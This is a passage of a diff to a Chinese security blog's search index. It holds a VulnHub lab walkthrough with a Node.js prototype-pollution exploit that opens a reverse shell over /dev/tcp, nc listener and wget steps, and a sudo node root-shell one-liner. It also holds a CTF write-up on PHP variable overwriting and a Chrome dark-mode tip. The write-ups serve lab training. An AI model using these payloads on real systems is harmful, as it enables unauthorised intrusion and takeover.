class="string">&#x27;which&#x27;</span>) || concat.includes(<span class="string">&#x27;socat&#x27;</span>)) &#123;</span><br><span class="line">			res.send(<span class="string">&#x27;Something went wrong&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		exec(concat, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (error) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">`error: <span class="subst">$&#123; error.message &#125;</span>`</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (stderr) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">`stderr: <span class="subst">$&#123; stderr &#125;</span>`</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			res.send(stdout);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		res.send(<span class="string">&#x27;Permission Denied&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">`Server running at <span class="subst">$&#123; port &#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+<p>上述代码中就可以验证确实是执行了系统命令，并且还记得之前弹出的“something went wrong”吗？这是因为这里做了过滤，但是仅仅只是判断了以下，并没有阻止命令执行。这就叫百密一疏吧。</p>
+<p>还有一个目录 <code>/opt/chronos-v2</code>，里面有一个<code>backend</code>的目录，这一看就是与后台有关。里面有一个<code>server.js</code>，代码如下： <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileupload = <span class="built_in">require</span>(<span class="string">&#x27;express-fileupload&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.use(fileupload(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;/opt/chronos-v2/frontend/pages&#x27;</span>);</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.render(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> server = http.Server(app);</span><br><span class="line"><span class="keyword">const</span> addr = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">server.listen(port, addr, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">&#x27;Server listening on &#x27;</span> + addr + <span class="string">&#x27; port &#x27;</span> + port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+<p>从这里能看出有一个8080端口，但是只能通过127.0.0.1才能访问，这也是为什么端口扫面无法得到这个端口。</p>
+<p>信息收集差不多，那么接下来就是要提权了。</p>
+<h2 id="权限提升-本地提权">权限提升-本地提权</h2>
+<p>Linux提权常用的三种方式：</p>
+<ol type="1">
+<li>内核漏洞</li>
+<li>suid提权</li>
+<li>sudo配置不当提权</li>
+</ol>
+<p>这里经过测试发现前两者都不行。因此得另想办法，忽然想到之前信息收集得到了一个技术 node.js。查看了<code>/chronos-v2/backend/package.json</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401142659.png" /></p>
+<p>这里的是否存在文件上传的漏洞？因此去搜一下，发现虽然不存在文件上传漏洞，但是存在node.js的原型链污染，可以使用这个漏洞进行提权。</p>
+<p>博客地址如下：https://blog.p6.is/Real-World-JS-1/</p>
+<p>还提供了exp： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.137.104/5555 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
+<p>（第一个ip为靶机IP，后面两个的端口为node.js所在端口，也就是8080，从刚刚的信息收集中知道）</p>
+<p>在kali上编写上面的程序，然后开启http服务，让靶机下载这个文件。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali: python -m SimpleHTTPServer 80</span><br><span class="line">靶机: </span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.137.104/exp.py</span><br></pre></td></tr></table></figure></p>
+<p>然后kali监听8888端口，靶机执行该程序 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali: nc -lvnp 8888</span><br><span class="line">靶机: </span><br><span class="line">	chmod +x exp.py</span><br><span class="line">	python3 exp.py</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401145431.png" /></p>
+<p>获得 imera 权限，虽然不是root，但是也足够读取其中一个flag了。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/home/imera/user.txt: </span><br><span class="line">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</span><br></pre></td></tr></table></figure></p>
+<p>接下来还需要提权，得到root权限。这里介绍常用的Linux提权的第三种，sudo配置提权。</p>
+<p>查看sudo配置： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401145800.png" /></p>
+<p>注意到用户imera拥有两个程序 npm和node的全部权限，还不需要密码，因此可以在这里提权。</p>
+<p>参考文章：https://gtfobins.github.io/gtfobins/node/</p>
+<p>执行以下命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo node -e &#x27;child_process.spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401150130.png" /></p>
+<p>提权成功。</p>
+<p>获取第二个flag： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/root/root.txt: </span><br><span class="line">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</span><br></pre></td></tr></table></figure></p>
+<p>至此，渗透过程结束。</p>
+<h1 id="彩蛋部分">彩蛋部分</h1>
+<p>将两个flag解码（base64），然后再放到谷歌去翻译，得到如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401150635.png" /></p>
+<h1 id="总结">总结</h1>
+<p>通过对这个靶机的渗透，有以下几点感受：</p>
+<ol type="1">
+<li>如同第一次权限提升的时候，经常会遇到我们不熟悉的技术，这时候就需要大量的搜索，快速学习！</li>
+<li>学习了第三种Linux提权的方式</li>
+<li>node.js的express-fileupload 1.1.7 存在原型链污染漏洞</li>
+</ol>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>综合</tag>
+        <tag>vulnhub</tag>
+        <tag>node.js原型链污染</tag>
+        <tag>nc串联</tag>
       </tags>
   </entry>
   <entry>
@@ -1967,51 +1967,6 @@
       </tags>
   </entry>
   <entry>
-    <title>BJDCTF2020 Mark loves cat</title>
-    <url>/2022/03/30/BJDCTF2020%20Mark%20loves%20cat/</url>
-    <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境就发现这应该是一个网站模板，查看了源码以及数据包，发现都没有任何信息。在网页最下方有一个留言，随便输入之后发送发现 url 产生了变化。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.html?message=1</span><br></pre></td></tr></table></figure></p>
-<p>故测试是否存在注入的可能，后来发现并没有。走投无路的情况下就进行目录扫描，发现存在 <code>.git</code> 泄露。（我用 <code>dirsearch</code> 扫不出来，不知道为什么。）</p>
-<h1 id="解题">解题</h1>
-<p>将源码下载后查看了发现了两个 php 文件。</p>
-<p>index.php（重要部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>; </span><br></pre></td></tr></table></figure></p>
-<p>flag.php <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>); </span><br></pre></td></tr></table></figure></p>
-<p>接下来进行代码审计。</p>
-<blockquote>
-<p>这里先说明一个知识点<code>$_GET as $x =&gt; $y</code>，假设get方式传入 flag=abc，那么这句代码的意思是 <code>$x=flag, $y=abc</code>。</p>
-</blockquote>
-<p>再看完 flag.php 之后再看 index.php，一开始的思路就是绕过前面的 if，然后执行最后的 <code>echo "the flag is: ".$flag;</code> 即可获得 flag。</p>
-<p>需要get传入参数才能触发第一个if，要满足第一个if的话，需要至少传入两个参数 <code>p1=str&amp;flag=p1</code>（这里p1和str任意，p1不能为flag），因此绕过也很简单。查看第二个if，只需要传入flag参数即可，无论什么方式。接下来查看第三个if，只要参数flag的值不为flag即可。</p>
-<p>这么一看，绕过彷佛很简单，只需要get或者post传入<code>flag=abc</code>即可。但是注意到最前面的两个<code>foreach</code>，这才是本题的考点。假设我们<code>flag=abc</code>以get方式传入，那么经过第二个<code>foreach</code>： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$x</span>=flag, <span class="variable">$y</span>=abc</span><br><span class="line"><span class="number">2</span>. <span class="variable">$$x</span>=<span class="variable">$flag</span>, <span class="variable">$$y</span>=<span class="variable">$abc</span></span><br><span class="line"><span class="number">3</span>. 因为<span class="variable">$abc</span>并不存在，所以为空，即<span class="variable">$flag</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="number">4</span>. 这样即使绕过了，输入的flag也为空</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330205641.png" /></p>
-<p>post方式也是一样，会被第一个<code>foreach</code>修改flag值。</p>
-<p>因此，绕过这个方法行不通。此时注意到有三个地方有 <code>exit</code> 该函数虽然会退出程序，但是在退出之前也会将变量打印出来。因此，接下来的思路有三个：</p>
-<ol type="1">
-<li>`<span class="math inline">\(handsome=\)</span>flag``</li>
-<li><code>$yds=$flag</code></li>
-<li>`<code>$is=$flag</code></li>
-</ol>
-<p>看思路1，我们需要get方式传入 <code>handsome=flag&amp;flag=handsome</code>，<strong>注意顺序</strong>。此时的执行过程如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$handsome</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$handsome</span>为flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$handsome</span> -&gt; <span class="variable">$flag</span>获取<span class="variable">$handsome</span>的值，也就是flag</span><br><span class="line"><span class="number">3</span>. 输出 <span class="variable">$handsome</span>，也就是flag</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211022.png" /></p>
-<p>看思路2，这个是最简单的，只需要get方式传入 <code>yds=flag</code>，此时： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$yds</span>=<span class="variable">$flag</span></span><br><span class="line">然后输出 <span class="variable">$yds</span>，即flag</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211048.png" /></p>
-<p>看思路3之前，我们得先明白，参数只能通过第二个<code>foreach</code>才行，也就是必须用get方式传入<code>is=flag</code>，如果是post传入则会变成<code>$is=flag</code>那么输出就真的是“flag”了（笑）。接下来需要满足第三个if才能输出，也就是还需要传入一个参数flag，且值为flag。如果用post传入，则经过第一个 <code>foreach</code>，就会变成 <code>$flag=flag</code>，此时后面即使 <code>$is=$flag</code>，输出的也是“flag”。因此只能通过get传入，因此最终的payload为 <code>is=flag&amp;flag=flag</code>，这里顺序无所谓。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$is</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$is</span>获得flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$flag</span> -&gt; 什么都没改变</span><br><span class="line"><span class="number">3</span>. 输出<span class="variable">$is</span>，即flag</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211638.png" /></p>
-<h1 id="总结">总结</h1>
-<p>本题考察的是 <strong>php变量覆盖漏洞</strong>。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>=<span class="string">&#x27; world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$hello</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">此时的结果为：hello world</span><br><span class="line">解释：因为 <span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>，所以 <span class="variable">$$a</span>=<span class="variable">$hello</span>=<span class="string">&#x27; world&#x27;</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330212116.png" /></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>git泄露</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ASIS 2019 Unicorn shop</title>
     <url>/2022/04/08/ASIS%202019%20Unicorn%20shop/</url>
     <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BASIS%202019%5DUnicorn%20shop">UnicornShop</a></p>
@@ -2097,6 +2052,51 @@
       </categories>
       <tags>
         <tag>Twig SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BJDCTF2020 Mark loves cat</title>
+    <url>/2022/03/30/BJDCTF2020%20Mark%20loves%20cat/</url>
+    <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境就发现这应该是一个网站模板，查看了源码以及数据包，发现都没有任何信息。在网页最下方有一个留言，随便输入之后发送发现 url 产生了变化。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.html?message=1</span><br></pre></td></tr></table></figure></p>
+<p>故测试是否存在注入的可能，后来发现并没有。走投无路的情况下就进行目录扫描，发现存在 <code>.git</code> 泄露。（我用 <code>dirsearch</code> 扫不出来，不知道为什么。）</p>
+<h1 id="解题">解题</h1>
+<p>将源码下载后查看了发现了两个 php 文件。</p>
+<p>index.php（重要部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>; </span><br></pre></td></tr></table></figure></p>
+<p>flag.php <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>); </span><br></pre></td></tr></table></figure></p>
+<p>接下来进行代码审计。</p>
+<blockquote>
+<p>这里先说明一个知识点<code>$_GET as $x =&gt; $y</code>，假设get方式传入 flag=abc，那么这句代码的意思是 <code>$x=flag, $y=abc</code>。</p>
+</blockquote>
+<p>再看完 flag.php 之后再看 index.php，一开始的思路就是绕过前面的 if，然后执行最后的 <code>echo "the flag is: ".$flag;</code> 即可获得 flag。</p>
+<p>需要get传入参数才能触发第一个if，要满足第一个if的话，需要至少传入两个参数 <code>p1=str&amp;flag=p1</code>（这里p1和str任意，p1不能为flag），因此绕过也很简单。查看第二个if，只需要传入flag参数即可，无论什么方式。接下来查看第三个if，只要参数flag的值不为flag即可。</p>
+<p>这么一看，绕过彷佛很简单，只需要get或者post传入<code>flag=abc</code>即可。但是注意到最前面的两个<code>foreach</code>，这才是本题的考点。假设我们<code>flag=abc</code>以get方式传入，那么经过第二个<code>foreach</code>： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$x</span>=flag, <span class="variable">$y</span>=abc</span><br><span class="line"><span class="number">2</span>. <span class="variable">$$x</span>=<span class="variable">$flag</span>, <span class="variable">$$y</span>=<span class="variable">$abc</span></span><br><span class="line"><span class="number">3</span>. 因为<span class="variable">$abc</span>并不存在，所以为空，即<span class="variable">$flag</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="number">4</span>. 这样即使绕过了，输入的flag也为空</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330205641.png" /></p>
+<p>post方式也是一样，会被第一个<code>foreach</code>修改flag值。</p>
+<p>因此，绕过这个方法行不通。此时注意到有三个地方有 <code>exit</code> 该函数虽然会退出程序，但是在退出之前也会将变量打印出来。因此，接下来的思路有三个：</p>
+<ol type="1">
+<li>`<span class="math inline">\(handsome=\)</span>flag``</li>
+<li><code>$yds=$flag</code></li>
+<li>`<code>$is=$flag</code></li>
+</ol>
+<p>看思路1，我们需要get方式传入 <code>handsome=flag&amp;flag=handsome</code>，<strong>注意顺序</strong>。此时的执行过程如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$handsome</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$handsome</span>为flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$handsome</span> -&gt; <span class="variable">$flag</span>获取<span class="variable">$handsome</span>的值，也就是flag</span><br><span class="line"><span class="number">3</span>. 输出 <span class="variable">$handsome</span>，也就是flag</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211022.png" /></p>
+<p>看思路2，这个是最简单的，只需要get方式传入 <code>yds=flag</code>，此时： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$yds</span>=<span class="variable">$flag</span></span><br><span class="line">然后输出 <span class="variable">$yds</span>，即flag</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211048.png" /></p>
+<p>看思路3之前，我们得先明白，参数只能通过第二个<code>foreach</code>才行，也就是必须用get方式传入<code>is=flag</code>，如果是post传入则会变成<code>$is=flag</code>那么输出就真的是“flag”了（笑）。接下来需要满足第三个if才能输出，也就是还需要传入一个参数flag，且值为flag。如果用post传入，则经过第一个 <code>foreach</code>，就会变成 <code>$flag=flag</code>，此时后面即使 <code>$is=$flag</code>，输出的也是“flag”。因此只能通过get传入，因此最终的payload为 <code>is=flag&amp;flag=flag</code>，这里顺序无所谓。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$is</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$is</span>获得flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$flag</span> -&gt; 什么都没改变</span><br><span class="line"><span class="number">3</span>. 输出<span class="variable">$is</span>，即flag</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211638.png" /></p>
+<h1 id="总结">总结</h1>
+<p>本题考察的是 <strong>php变量覆盖漏洞</strong>。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>=<span class="string">&#x27; world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$hello</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">此时的结果为：hello world</span><br><span class="line">解释：因为 <span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>，所以 <span class="variable">$$a</span>=<span class="variable">$hello</span>=<span class="string">&#x27; world&#x27;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330212116.png" /></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>git泄露</tag>
       </tags>
   </entry>
   <entry>
@@ -2346,41 +2346,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Chrome 黑暗模式</title>
-    <url>/2022/04/07/Chrome%20%E9%BB%91%E6%9A%97%E6%A8%A1%E5%BC%8F/</url>
-    <content><![CDATA[<p>记录个人日常生活中遇到的繁琐的小问题的解决。</p>
-<span id="more"></span>
-<h1 id="问题描述">问题描述</h1>
-<p>chrome无论是主题设置为<code>Just Black</code>，还是利用各种插件，总是有不满意的地方。</p>
-<p>前者只是将状态栏、工具栏、书签栏和新标签页变成黑暗模式，而其他网页还是白的。</p>
-<p>而后者在页面切换的时候会先跳一下白，然后才会变黑。</p>
-<p>这些问题对于我这种强迫症患者是不能接受的。</p>
-<h1 id="解决方案">解决方案</h1>
-<p>我的机子的操作系统是 Win11。</p>
-<p>现在有一种完全不需要插件和主题的黑暗模式。</p>
-<ol type="1">
-<li><p>打开chrome，在地址栏输入<code>chrome://flags</code>，然后回车 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095058.png" /></p></li>
-<li><p>找到<code>Auto Dark Mode for Web Contents</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095132.png" /></p></li>
-<li><p>然后将红色方框设置为<code>Enabled</code>（我这里已经设置好了），然后重启即可 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095215.png" /></p></li>
-</ol>
-<h1 id="对比">对比</h1>
-<p>这是原来只改了主题的黑暗模式</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095502.png" /></p>
-<p>这是设置完成之后的黑暗模式</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095529.png" /></p>
-<h1 id="小问题">小问题</h1>
-<p>不过还是存在一点小bug的，看你们能不能接受了。我发现的一个就是在哔哩哔哩的播放界面，鼠标光标放到视频上的时候，视频会泛白，如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095649.png" /></p>
-]]></content>
-      <categories>
-        <category>Windows</category>
-      </categories>
-      <tags>
-        <tag>chrome</tag>
-        <tag>dark mode</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>De1CTF 2019 SSRF Me</title>
     <url>/2022/04/11/De1CTF%202019%20SSRF%20Me/</url>
     <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BDe1CTF%202019%5DSSRF%20Me">SSRF_ME</a></p>
@@ -2429,6 +2394,41 @@
         <tag>代码审计</tag>
         <tag>python</tag>
         <tag>SSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Chrome 黑暗模式</title>
+    <url>/2022/04/07/Chrome%20%E9%BB%91%E6%9A%97%E6%A8%A1%E5%BC%8F/</url>
